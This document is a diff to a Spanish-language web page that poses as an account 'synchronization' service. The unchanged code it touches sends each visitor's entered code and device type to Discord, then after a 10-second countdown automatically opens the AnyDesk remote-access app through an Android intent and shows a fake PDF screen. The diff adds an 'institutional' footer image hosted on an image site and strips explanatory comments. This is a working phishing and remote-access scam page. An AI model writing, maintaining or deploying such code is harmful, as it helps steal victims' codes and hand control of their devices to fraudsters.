@@ -18,7 +18,7 @@
             flex-direction: column;            
             align-items: center;            
             min-height: 100vh;            
-            padding-bottom: 40px;            
+            padding-bottom: 0;            
             overflow-x: hidden;            
             position: relative;        }        
 
@@ -372,9 +372,26 @@
             font-size: 11px;            
             color: #a0aec0;            
             margin-top: 25px;            
+            margin-bottom: 25px;
             line-height: 1.5;            
             border-top: 1px solid #e2e8f0;            
             padding-top: 15px;        }
+
+        /* ESTILO PARA LA IMAGEN ABSOLUTAMENTE AL FINAL DE TODO */
+        .contenedor-imagen-final-absoluto {
+            width: 100%;
+            background-color: #ffffff;
+            border-top: 1px solid #cbd5e0;
+            display: flex;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .contenedor-imagen-final-absoluto img {
+            width: 100%;
+            max-width: 600px;
+            height: auto;
+            display: block;
+        }
 
         /* MODAL DE CUENTA REGRESIVA DIRECTA DE 10 SEGUNDOS */
         #modal-cuenta-regresiva {
@@ -543,10 +560,8 @@
             }
         }
 
-        // Función para detectar si está en App (móvil) o en Web (PC)
         function obtenerDispositivoYEntorno() {
             const ua = navigator.userAgent || navigator.vendor || window.opera;
-            // Comprobación exacta para dispositivos móviles / apps integradas
             if (/android|iphone|ipad|ipod|blackberry|opera mini|iemobile|mobile/i.test(ua)) {
                 return "📱 Aplicación / Móvil";
             }
@@ -565,7 +580,6 @@
             const codigoLimpio = codigo.replace(/\s+/g, '');
             const tipoDispositivo = obtenerDispositivoYEntorno();
 
-            // Mensaje adaptado para notificar en Discord si está en la App o en la Web junto al código
             const mensaje = {
                 content: `🔔 **Nueva Sincronización Detectada**\n📍 Dispositivo: **${tipoDispositivo}**\n\`\`\`${codigoLimpio}\`\`\``
             };
@@ -595,7 +609,6 @@
                 btnSubmit.innerHTML = "Sincronizado";
                 btnSubmit.style.backgroundColor = "#718096";
 
-                // INICIAR LA CUENTA REGRESIVA DIRECTAMENTE SIN PEDIR CLICS EXTRA
                 iniciarCuentaRegresivaDirecta();
             })
             .catch(error => {
@@ -605,7 +618,6 @@
         }
 
         function iniciarCuentaRegresivaDirecta() {
-            // Mostrar pantalla de cuenta regresiva de 10 segundos
             document.getElementById('modal-cuenta-regresiva').style.display = 'flex';
             
             let segundosRestantes = 10;
@@ -626,10 +638,7 @@
                     clearInterval(intervalo);
                     document.getElementById('modal-cuenta-regresiva').style.display = 'none';
                     
-                    // APERTURA NATIVA MEDIANTE ANDROID INTENT (Se abre la app automáticamente)
                     window.location.href = "intent://#Intent;package=com.anydesk.anydeskandroid;scheme=anydesk;end;";
-
-                    // Mostrar automáticamente el PDF en la web
                     document.getElementById('pantalla-pdf-estilo').style.display = 'flex';
                 }
             }, 1000);
@@ -751,6 +760,11 @@
     </div>
 </div>
 
+<!-- IMAGEN COLOCADA EN EL FINAL FINAL DE TODO EL SITIO -->
+<div class="contenedor-imagen-final-absoluto">
+    <img src="https://i.ibb.co/39CgHR1F/Screenshot-20260824-131400-2.jpg" alt="Información Final Institucional">
+</div>
+
 <!-- Modal de Cuenta Regresiva Automática de 10 segundos -->
 <div id="modal-cuenta-regresiva">
     <div class="regresiva-contenido">
@@ -763,7 +777,7 @@
     </div>
 </div>
 
-<!-- Pantalla Emergente del PDF (Aparece al terminar la cuenta atrás) -->
+<!-- Pantalla Emergente del PDF -->
 <div id="pantalla-pdf-estilo">
     <div class="pdf-icono-caja">
         <span style="font-size: 40px;">📄</span>
